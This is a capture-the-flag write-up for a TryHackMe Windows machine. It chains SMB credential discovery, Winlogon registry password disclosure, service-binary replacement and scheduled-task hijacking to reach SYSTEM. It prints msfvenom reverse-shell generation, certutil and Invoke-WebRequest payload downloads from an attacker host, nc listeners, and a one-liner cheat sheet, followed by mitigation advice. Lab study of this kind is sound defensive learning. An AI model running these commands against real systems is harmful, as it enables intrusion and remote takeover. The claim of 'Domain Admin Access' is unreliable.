# WindowsJump - TryHackMe Medium Machine

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![OS](https://img.shields.io/badge/OS-Windows-0078D4)
![Status](https://img.shields.io/badge/Status-Pwned-brightgreen)

## Machine Information

| Property | Value |
|----------|-------|
| **Machine Name** | WindowsJump |
| **Platform** | TryHackMe |
| **Difficulty Level** | Medium |
| **Operating System** | Windows Server 2019 (Build 17763) |
| **IP Address** | `10.49.151.217` |
| **Release Date** | May 2026 |

## Executive Summary

WindowsJump is a Windows-based privilege escalation challenge that demonstrates multi-stage lateral movement and privilege escalation techniques. The machine features registry credential exposure, service binary replacement via DACL misconfigurations, and scheduled task manipulation leading to SYSTEM-level access.

**Key Attack Vectors:**
- SMB enumeration revealing default employee credentials
- RDP access with credential reuse
- Windows Registry credential disclosure (Winlogon)
- Service binary replacement via misconfigured folder permissions
- Scheduled task manipulation with SYSTEM privileges

---

## Network Enumeration

### Full Port Scan

```bash
nmap -p- 10.49.151.217
```

**Results:**
```
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 128
139/tcp   open  netbios-ssn   syn-ack ttl 128
445/tcp   open  microsoft-ds  syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
7680/tcp  open  pando-pub     syn-ack ttl 128
47001/tcp open  winrm         syn-ack ttl 128
49664/tcp open  unknown       syn-ack ttl 128
49665/tcp open  unknown       syn-ack ttl 128
49666/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49669/tcp open  unknown       syn-ack ttl 128
49670/tcp open  unknown       syn-ack ttl 128
49671/tcp open  unknown       syn-ack ttl 128
49678/tcp open  unknown       syn-ack ttl 128
```

### Service & Version Detection

```bash
nmap -sV -p 135,139,445,3389,5985,7680,47001 10.49.151.217
```

**Key Services Identified:**

| Port | Service | Details |
|------|---------|---------|
| **135/tcp** | MS-RPC | Microsoft Windows RPC |
| **139/tcp** | NetBIOS-SSN | Microsoft Windows netbios-ssn |
| **445/tcp** | SMB | Microsoft-ds |
| **3389/tcp** | RDP | Terminal Services (TLS) |
| **5985/tcp** | WinRM (HTTP) | Microsoft HTTPAPI httpd 2.0 |
| **47001/tcp** | WinRM (HTTP) | Microsoft HTTPAPI httpd 2.0 |
| **49664-49678/tcp** | MS-RPC | Windows RPC endpoints |

**System Information:**
```
Target_Name: PRIVESC
NetBIOS_Domain_Name: PRIVESC
NetBIOS_Computer_Name: PRIVESC
DNS_Domain_Name: privesc
DNS_Computer_Name: privesc
Product_Version: 10.0.17763 (Windows Server 2019)
```

---

## Initial Access

### SMB Enumeration

```bash
smbclient -L 10.49.151.217 -N
```

**Available Shares:**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Public          Disk      Public file share
```

### Credential Discovery

```bash
smbclient //10.49.151.217/Public -N
smb: \> ls
  .                                   D        0  Mon May 11 06:40:51 2026
  ..                                  D        0  Mon May 11 06:40:51 2026
  welcome.txt                         A      177  Mon May 11 06:40:50 2026

smb: \> get welcome.txt
```

**Contents of welcome.txt:**
```
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!
```

### RDP Access

Using the discovered credentials, we establish RDP access to the machine:

```bash
# Access granted with thmuser:Password1!
rdesktop -u thmuser -p Password1! 10.49.151.217
```

---

## Privilege Escalation Chain

### Stage 1: Lateral Movement to `notadmin`

#### Registry Credential Disclosure

The Windows Registry often contains cached credentials in the Winlogon hive. Query the registry for cached credentials:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Output:**
```
DefaultUserName    REG_SZ    notadmin
DefaultPassword    REG_SZ    P@ssw0rd!
```

#### Privilege Escalation using `runas`

Escalate to the `notadmin` user account:

```powershell
runas /user:PRIVESC\notadmin powershell.exe
```

**Verification:**
```powershell
C:\Windows\system32> whoami
privesc\notadmin

C:\Windows\system32> type C:\Users\notadmin\Desktop\flag2.txt
THM{w1nl0g0n_cr3ds_3xp0s3d}
```

**Flag 2 Obtained:** `THM{w1nl0g0n_cr3ds_3xp0s3d}`

---

### Stage 2: Privilege Escalation to `svcadmin`

#### Service Enumeration

Identify services running under the `svcadmin` account:

```powershell
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

**Output:**
```
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

#### DACL Analysis

Check the Access Control List (ACL) on the service binary directory:

```powershell
icacls C:\Windows\THMSVC\
```

**Permissions:**
```
PRIVESC\notadmin:(OI)(CI)(F)  [Full Control]
```

**Vulnerability:** The `notadmin` user has **Full Control (F)** over the `C:\Windows\THMSVC\` directory, allowing binary replacement.

#### Malicious Binary Generation

Create a reverse shell executable using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.49.127.78 \
  LPORT=4444 \
  -f exe-service \
  -o svc.exe
```

#### Binary Replacement

Transfer the malicious executable to the target:

```powershell
# Start HTTP server on attacker machine
python3 -m http.server 8080

# Download on target machine
Invoke-WebRequest -Uri "http://10.49.127.78:8080/svc.exe" `
  -OutFile "C:\Windows\THMSVC\svc.exe"
```

#### Service Restart & Shell Acquisition

Restart the service to execute the malicious binary:

```powershell
sc start THMSvc
```

**Listener Setup:**
```bash
rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.49.151.217 50644
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
privesc\svcadmin
```

**Flag 3 Retrieved:**
```powershell
C:\Users\svcadmin\Desktop> type flag3.txt
THM{s3rv1c3_pr1v_3sc_ftw}
```

**Flag 3 Obtained:** `THM{s3rv1c3_pr1v_3sc_ftw}`

---

### Stage 3: SYSTEM-Level Privilege Escalation

#### Scheduled Task Discovery

Locate scheduled tasks with elevated privileges:

```powershell
dir C:\Windows\Tasks\
```

**Output:**
```
Directory of C:\Windows\Tasks

05/11/2026  06:42 AM    <DIR>          .
05/11/2026  06:42 AM    <DIR>          ..
05/11/2026  06:41 AM                41 cleanup.bat
```

#### ACL Analysis on Scheduled Task

```powershell
icacls C:\Windows\Tasks\cleanup.bat
```

**Permissions:**
```
cleanup.bat  
  BUILTIN\Users:(I)(RX)
  PRIVESC\svcadmin:(I)(M)           [Modify permission]
  BUILTIN\Administrators:(I)(F)
  NT AUTHORITY\SYSTEM:(I)(F)
```

**Vulnerability:** The `svcadmin` user has **Modify (M)** permissions on `cleanup.bat`, which is executed by SYSTEM via scheduled task.

#### Malicious Shell Generation

Create another reverse shell executable:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.49.127.78 \
  LPORT=4445 \
  -f exe \
  -o shell.exe
```

#### Binary Transfer

Use `certutil` to download the malicious executable:

```powershell
certutil -urlcache -split -f http://10.49.127.78:8000/shell.exe `
  C:\Windows\Tasks\shell.exe
```

#### Scheduled Task Hijacking

Replace the content of `cleanup.bat` to execute our malicious shell:

```powershell
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

**Explanation:** This command redirects `shell.exe` execution into `cleanup.bat`. When the scheduled task runs `cleanup.bat` as SYSTEM, our reverse shell executes.

#### SYSTEM-Level Shell Acquisition

Set up listener on attacker machine:

```bash
rlwrap nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on 10.49.151.217 50775
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

#### Flag Retrieval

```powershell
C:\> type C:\Users\Administrator\Desktop\flag4.txt
THM{sch3dul3d_t4sk_pr1v_3sc}
```

**Flag 4 Obtained:** `THM{sch3dul3d_t4sk_pr1v_3sc}`

---

## Complete Attack Chain

```
Initial Access (thmuser:Password1!)
        ↓
Registry Enumeration (Winlogon)
        ↓
Lateral Movement to notadmin (P@ssw0rd!)
        ↓
Service Enumeration (THMSvc - svcadmin)
        ↓
DACL Analysis (Full Control on C:\Windows\THMSVC\)
        ↓
Binary Replacement Attack
        ↓
Privilege Escalation to svcadmin
        ↓
Scheduled Task Discovery (cleanup.bat)
        ↓
Task File Modification (Modify Permissions)
        ↓
Shell Injection into cleanup.bat
        ↓
SYSTEM-Level Code Execution
        ↓
Domain Admin Access Achieved ✓
```

---

## Tools & Commands Reference

### Network Reconnaissance
```bash
nmap -p- <target>                          # Full port scan
nmap -sV -p <ports> <target>              # Service version detection
```

### SMB Enumeration
```bash
smbclient -L <target> -N                  # List shares (null auth)
smbclient //<target>/<share> -N           # Connect to share
```

### Credential Harvesting
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Service Manipulation
```powershell
wmic service get name,pathname,startname | findstr <service>
icacls <path>                             # Check file permissions
sc start <service>                        # Start service
```

### Reverse Shell Generation
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o <output>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o <output>
```

### File Transfer
```powershell
Invoke-WebRequest -Uri "<URL>" -OutFile "<Path>"
certutil -urlcache -split -f <URL> <destination>
```

### Listener Setup
```bash
rlwrap nc -lvnp <port>
```

---

## Key Takeaways

### 1. **Registry Credential Exposure**
   - Windows Winlogon registry hive frequently contains cached credentials
   - Regularly audit and secure `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
   - Consider using Windows Credential Manager instead of plaintext registry storage

### 2. **Service Binary Replacement via DACL Misconfiguration**
   - Services run with elevated privileges (SYSTEM, service account)
   - Improper ACLs on service directories enable binary replacement attacks
   - Always restrict write permissions on service binary directories to Administrators only
   - Apply principle of least privilege to file system ACLs

### 3. **Multi-Stage Lateral Movement**
   - Initial compromise doesn't grant maximum privileges immediately
   - Enumerate available accounts and services for escalation paths
   - Each stage may require different exploitation techniques

### 4. **Scheduled Task Hijacking**
   - Scheduled tasks running as SYSTEM with modifiable scripts create privilege escalation vectors
   - SYSTEM-scheduled tasks should have restricted write permissions (Administrators only)
   - Regularly audit `C:\Windows\Tasks\` and scheduled task ACLs

### 5. **Service Account Abuse**
   - Service accounts often have specific privilege sets designed for application functionality
   - If compromised, these accounts can be leveraged for lateral movement
   - Monitor service account activity and implement service account management

### 6. **Windows Privilege Escalation Methodology**
   - **Enumeration:** Identify available services, tasks, and registry data
   - **Analysis:** Check permissions (ACLs) for writable resources
   - **Exploitation:** Leverage misconfigurations to gain elevated access
   - **Verification:** Confirm privilege level (whoami, token analysis)

### 7. **File Transfer Security**
   - Even `certutil` can be abused for arbitrary file download
   - Restrict outbound HTTP/HTTPS connections for sensitive systems
   - Monitor PowerShell `Invoke-WebRequest` usage in logs

### 8. **Command Shell Restrictions**
   - PowerShell provides richer environment than cmd.exe
   - Always escalate to PowerShell when possible for more capabilities
   - Consider disabling `cmd.exe` on sensitive systems

### 9. **Msfvenom Payload Generation**
   - `-f exe-service` generates service-compatible payloads
   - `-f exe` generates standard executable payloads
   - Test payloads in lab environments before deployment

### 10. **Defense Strategy**
   - Implement least privilege for all accounts and services
   - Regular security audits of ACLs on critical directories
   - Monitor registry access and file modifications
   - Implement file integrity monitoring (FIM)
   - Restrict scheduled task execution and monitor for unexpected changes

---

## Mitigation Recommendations

### Immediate Actions
- Remove cached credentials from Winlogon registry
- Apply proper ACLs to all service binary directories (Administrators: Full Control only)
- Restrict modify permissions on scheduled task scripts
- Implement Windows Firewall rules to prevent outbound shell downloads

### Long-Term Security Improvements
- Deploy Group Policy for centralized ACL management
- Implement Windows Audit policies for registry and file system access
- Use Service Account Management solutions
- Deploy EDR (Endpoint Detection & Response) for behavioral analysis
- Conduct regular penetration testing and privilege escalation assessments
- Implement application whitelisting to prevent execution of unauthorized binaries



---

## References

- [Windows Registry Forensics](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry)
- [Access Control Lists (ACLs)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/access-control)
- [Windows Services Security](https://docs.microsoft.com/en-us/windows/win32/services/services)
- [Scheduled Tasks Security](https://docs.microsoft.com/en-us/windows/desktop/taskschd/task-scheduler-start-page)
- [Msfvenom Documentation](https://docs.metasploit.com/api/Msf/Modules/Payload.html)
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/learn/security)

---

**Write-up Completed:** October 6, 2026  
**Machine Status:** ✓ Pwned (Root Access Achieved)  
**Difficulty Assessment:** Medium - Multi-stage privilege escalation requiring enumeration and ACL analysis
**Jai Shri Ram**
